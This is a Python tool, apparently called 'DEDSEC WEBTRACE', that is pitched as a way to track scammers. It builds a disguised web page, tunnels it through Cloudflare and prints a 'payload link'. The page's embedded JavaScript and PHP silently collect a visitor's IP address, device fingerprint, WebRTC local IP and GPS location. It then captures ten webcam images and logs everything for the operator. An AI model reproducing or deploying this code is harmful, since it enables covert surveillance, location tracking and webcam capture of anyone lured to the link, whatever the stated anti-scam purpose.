#!/usr/bin/python3
#coded by 0xbit
import os, sys, requests, time, re, subprocess
from tabulate import tabulate
from tqdm import tqdm

port = 8080

curdir = os.getcwd()

RESET = "\033[0m"
GREEN = "\033[92m"
RED = "\033[91m"
green_dot = '[\033[92m●\033[0m]'
green_command = '[\033[92m+\033[0m]'
red_warning = '[\033[91m!\033[0m]'

def banner():
    os.system('clear')
    text = '''


        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣆⠐⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠆⠹⠦⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⣤⣀⠐⣶⣶⣶⣶⣶⣶⡀⢀⣀⣀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⢿⣿⡆⢹⡿⠻⢿⣿⣿⣷⠈⠿⠛⠁⠀⠀|░░░░░░░░░░░░░░░░░
        ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣾⣷⣤⣉⣠⣾⣷⣦⣼⣿⣿⣿⣧⠀⠀⠀⠀⠀|░░░▄░▀▄░░░▄▀░▄░░░
        ⠀⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀|░░░█▄███████▄█░░░
        ⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀|░░░███▄███▄███░░░
        ⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⠻⢧⣘⡷⠀⠀⠀|░░░▀█████████▀░░░
        ⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⣉⠛⠿⣷⣦⣌⠁⠀⠀⠀|░░░░▄▀░░░░░▀▄░░░░
        ⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⣠⠘⠀⠀⢹⣿⣶⣶⠀⠀⠀⠀⠀⠀|░░░░░░░░░░░░░░░░░
        ⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⢺⣿⠀⠀⠀⠘⣿⣿⡟⠀⠀⠀⠀⠀⠀|    
        ⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠁⠀⠀⠀⠀⠻⡟⠃⠀⠀⠀⠀⠀⠀|  DEDSEC WEBTRACE
        ⠀⠛⠛⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀      |  Coded by: 0xbit
         expose and track scammers. 
    
    '''
    print(text)
    
def builder_page(path, CUSTOM_PAGE):
    page_c = '''
<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $ip = $_SERVER['REMOTE_ADDR'];
    $type = $_POST['type'] ?? 'waiting..';
    $value = $_POST['value'] ?? 'waiting..';
    $gps = $_POST['gps'] ?? 'waiting..';
    if ($type === "IP") {
        file_put_contents(".info", "[IP] ($value)\n", FILE_APPEND);
    } elseif ($type === "Camera") {
        if (!is_dir("images")) {
            mkdir("images", 0777, true);
        }
        $number = $_POST['number'] ?? 1;
        $unique_id = substr(md5(uniqid(mt_rand(), true)), 0, 6);
        $filename = "images/camshot-$ip-$gps-$number-$unique_id.jpg";
        $imageData = base64_decode($value);
        file_put_contents($filename, $imageData);
    } else {
        $data = "[$type] $value\n";
        file_put_contents(".info", $data, FILE_APPEND);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Info Collector</title>
    <script>
        let userIP = "<?php echo $_SERVER['REMOTE_ADDR']; ?>";
        let gpsCoords = "waiting..";
        function sendData(type, value, extraData = {}) {
            let formData = new URLSearchParams();
            formData.append("type", type);
            formData.append("value", value);
            formData.append("gps", gpsCoords);

            for (const key in extraData) {
                formData.append(key, extraData[key]);
            }
            fetch("index.php", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: formData.toString()
            });
        }
        function gatherInfo() {
            sendData("IP", userIP);
            sendData("Browser", navigator.userAgent);
            sendData("Screen Size", screen.width + "x" + screen.height);
            sendData("OS", navigator.platform);
            sendData("Device", /Mobi/i.test(navigator.userAgent) ? "Mobile" : "Desktop");
            sendData("Language", navigator.language);
            sendData("Timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
            sendData("Referrer", document.referrer || "Direct");
            sendData("CPU Cores", navigator.hardwareConcurrency || "waiting..");
            sendData("RAM", navigator.deviceMemory ? navigator.deviceMemory + "GB" : "waiting..");
            sendData("Touch Support", navigator.maxTouchPoints > 0 ? "Yes" : "No");
            sendData("Online Status", navigator.onLine ? "Online" : "Offline");
            sendData("Do Not Track", navigator.doNotTrack === "1" ? "Enabled" : "Disabled");
            getWebRTCLocalIP();
            requestGPS();
        }
        function requestGPS() {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    let gpsCoords = pos.coords.latitude + "," + pos.coords.longitude;
                    sendData("GPS", "https://www.google.com/maps?q=" + gpsCoords);
                    startCameraShots(10);
                },
                () => {
                    gpsCoords = "Denied";
                    sendData("GPS", "Denied");
                    startCameraShots(10);
                }
            );
        }
        function startCameraShots(count) {
            let video = document.createElement("video");
            let canvas = document.createElement("canvas");
            let context = canvas.getContext("2d");
            navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
                video.srcObject = stream;
                video.play();
                let shotCount = 0;
                let takeShot = () => {
                    if (shotCount < count) {
                        setTimeout(() => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            let cameraData = canvas.toDataURL("image/jpeg").split(",")[1];
                            sendData("Camera", cameraData, {
                                number: shotCount + 1 
                            });
                            shotCount++;
                            takeShot();
                        }, 100);
                    } else {
                        stream.getTracks().forEach(track => track.stop());
                    }
                };
                takeShot();
            }).catch(() => {
                sendData("Camera", "No image");
            });
        }
        function getWebRTCLocalIP() {
            let pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel("");
            pc.createOffer().then((offer) => pc.setLocalDescription(offer));
            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    let ip = event.candidate.candidate.split(" ")[4];
                    sendData("WebRTC Local IP", ip);
                    pc.close();
                }
            };
        }
    </script>
</head>
<body onload="gatherInfo()">'''
    page_c1 = f'''
    {CUSTOM_PAGE}
</body>
</html>
    '''
    with open(f'{path}/index.php', 'w') as wr:
        wr.write(page_c)
        wr.write(page_c1)

def extract_data_from_file(filename):
    data = {
        "IP": "waiting..",
        "Browser": "waiting..",
        "Screen Size": "waiting..",
        "OS": "waiting..",
        "Device": "waiting..",
        "Language": "waiting..",
        "Timezone": "waiting..",
        "Referrer": "waiting..",
        "CPU Cores": "waiting..",
        "RAM": "waiting..",
        "Touch Support": "waiting..",
        "Online Status": "waiting..",
        "Do Not Track": "waiting..",
        "WebRTC Local IP": "waiting..",
        "GPS": "waiting.."
    }
    with open(filename, "r") as file:
        for line in file:
            match = re.match(r"\[(.*?)\]\s*(?:\((.*?)\)|(.+))", line)
            if match:
                key = match.group(1).strip()
                value = match.group(2) if match.group(2) else match.group(3)
                if key in data:
                    data[key] = value.strip()
    return data

def monitor_file(filename):
    try:
        print(f"\t {green_dot} Waiting for the scammer to open the page... {RED}(ctrl+c to stop){RESET}")
        with open(filename, 'w') as f:
            f.write('')
        last_position = 0
        while True:
            with open(filename, "r") as file:
                file.seek(last_position)
                new_lines = file.readlines()
                last_position = file.tell()
                if new_lines:
                    print()
                    data = extract_data_from_file(filename)
                    table_data = [[f"{key}", f"{GREEN}{value}{RESET}"] for key, value in data.items()]
                    formatted_output = tabulate(table_data, headers=["Field", "Value"], tablefmt="fancy_grid")
                    print("\n" + '\n'.join(['\t ' + line for line in formatted_output.split('\n')]))
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit()

def get_cloudflared():
    os.system('clear')
    try:
        if not os.path.exists(f'.runner'):
            arch = subprocess.check_output(['uname', '-m']).decode().strip()
            if 'arm' in arch or 'Android' in arch:
                response = requests.get('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm', stream=True)
            elif 'aarch64' in arch:
                response = requests.get('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64', stream=True)
            elif 'x86_64' in arch:
                response = requests.get('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', stream=True)
            else:
                response = requests.get('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386', stream=True)
            local_filename = ".runner"
            file_size = int(response.headers.get("content-length", 0))
            with open(local_filename, "wb") as file, tqdm(desc=f'{green_command} Downloading resources',total=file_size,unit="B",unit_scale=True,unit_divisor=1024,) as bar:
                for data in response.iter_content(chunk_size=1024):
                    file.write(data)
                    bar.update(len(data))
            os.system('chmod +x .runner')
        else:
            pass
    except KeyboardInterrupt:
        os.remove('.runner')
        sys.exit()
        
def kill_process():
    try:
        ps_output = subprocess.check_output(["ps", "aux"]).decode("utf-8")
        for line in ps_output.split("\n"):
            if "php" in line or "runner" in line:
                match = re.search(r"\s*(\d+)", line)
                if match:
                    pid = match.group(1)
                    subprocess.run(["kill", "-9", pid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"\n\t {red_warning} Error: {e}")
        
def port_forward(path, port):
    os.chdir(path)
    kill_process()
    try:
        print('\t  │')
        print(f'\t {green_command} Deploying Page...')
        subprocess.Popen(f'php -S 127.0.0.1:{port}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        
        print('\t  │')
        print(f'\t {green_command} Getting link...')
        print('\t  │')
        

        with open('.log', 'w') as clear:
            clear.write('')
        
        subprocess.Popen(f"{curdir}/.runner tunnel -url 127.0.0.1:{port} --logfile .log", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        pattern = r'[-0-9a-z]+\.trycloudflare\.com'

        while True:
            with open(".log", "r") as log_file:
                log_contents = log_file.read()
            if log_contents:
                matches = re.search(pattern, log_contents.strip())
                if matches:
                    clink = matches.group()
                    print(f'\t {green_command} PAYLOAD LINK: \033[92mhttps://{clink}\033[0m')
                    print('\t  │')
                    break
            else:
                time.sleep(1)
                continue
    except KeyboardInterrupt:
        sys.exit()
        
    monitor_file(".info")
    
def check_F(folder):
    valid_extensions = {".php", ".html", ".css"}
    found_files = []
    index_file_content = None 
    index_file_path = None    
    for root, dirs, files in os.walk(folder):
        for file in files:
            file_path = os.path.join(root, file)
            _, ext = os.path.splitext(file)

            if ext.lower() in valid_extensions:
                found_files.append(file_path)

            if file.lower() in {"index.php", "index.html"} and index_file_path is None:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    index_file_content = f.read()
                index_file_path = file_path 
                print(f"\n\t {green_command} Found Your Index File: {GREEN}{index_file_path}{RESET}")
                break
    if found_files:
        print('\t  │')
        print(f"\t {green_command} Found {len(found_files)} web-files in '{folder}':")
        print('\t  │')
        for f in found_files:
            print(f"\t  ├──📂 {f}")
    else:
        pass
    return index_file_content, index_file_path

def main():
    folder_path = "MYPAGE" 
    if os.path.exists(folder_path):
        index_content, index_path = check_F(folder_path)
        if index_path:
            directory = os.path.dirname(index_path)
            builder_page(directory, index_content)
            time.sleep(1)
            port_forward(directory, port)
        else:
            print(f"\n\t {red_warning} No web-files found inside '{GREEN}MYPAGE{RESET}'.\n")
    else:
        os.mkdir(folder_path)
        print(f"\n\t {red_warning} No web-files found in '{GREEN}MYPAGE.{RESET}' Please put your page inside.\n")
        
if __name__ == "__main__":
    get_cloudflared()
    banner()
    main()

    


